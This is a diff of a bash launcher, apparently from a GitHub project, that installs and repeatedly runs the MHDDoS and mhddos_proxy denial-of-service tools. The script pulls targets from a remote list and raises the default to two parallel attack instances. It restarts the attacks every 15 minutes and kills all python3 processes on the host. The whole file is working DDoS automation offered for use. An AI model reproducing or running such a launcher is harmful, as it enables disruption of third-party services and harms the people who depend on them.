@@ -9,9 +9,9 @@
 ## "num_of_copies" allows to start several copies of runner.py.
 ## Each copy will choose different target from https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets
 ## This is different from "multiple targets" in mhddos_proxy. Built in mhddos_proxy "multiple targets" can attack multiple IP's but only with same one method.
-## "num_of_copies" allows to launch several copies of runner.py and targets will be attacked with different methods, if specified.
-## By default only 1 copy is launched. Value can be passed as first argument. Don't use high values, pc/vps can slowdown or even freeze.
-num_of_copies="${1:-1}"
+## "num_of_copies" allows to launch several copies of runner.py and targets will be attacked with different methods.
+## Default = 2 copies(instances). Don't use high values without testing first, pc/vps can slowdown.
+num_of_copies="${1:-2}"
 
 ## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
 ## It allows to download updates for mhddos_proxy, MHDDoS and target list.
@@ -22,19 +22,13 @@ restart_interval="${2:-900}"
 pkill -f start.py
 pkill python3
 
-#sudo apt update
-
-# Install git if it doesn't installed already
+# Install git, python3, pip if doesn't installed already
 if [ ! -f /usr/bin/git ]; then
    sudo apt install git -y
 fi
-
-# Install python3 if it doesn't installed already
 if [ ! -f /usr/bin/python3 ]; then
    sudo apt install python3 -y
 fi
-
-# Install pip if it doesn't installed already
 if [ ! -f /usr/bin/pip ]; then
    apt install python3-pip  -y
 fi
@@ -49,6 +43,7 @@ cd mhddos_proxy
 git clone https://github.com/MHProDev/MHDDoS.git
 python3 -m pip install -r MHDDoS/requirements.txt
 
+# Restart attacks and update targets list every 15 minutes (by default)
 while true
 echo -e "#####################################\n"
 do
@@ -81,7 +76,7 @@ do
 echo -e "#####################################\n"
 sleep $restart_interval
 echo -e "RESTARTING\n"
-pkill -f start.py #in theory should work but doesn't give good results
-pkill python3 #work flawlessly
+pkill -f start.py #In theory should work but doesn't give good results
+pkill python3 #It just works (c)
 sleep 2
 done
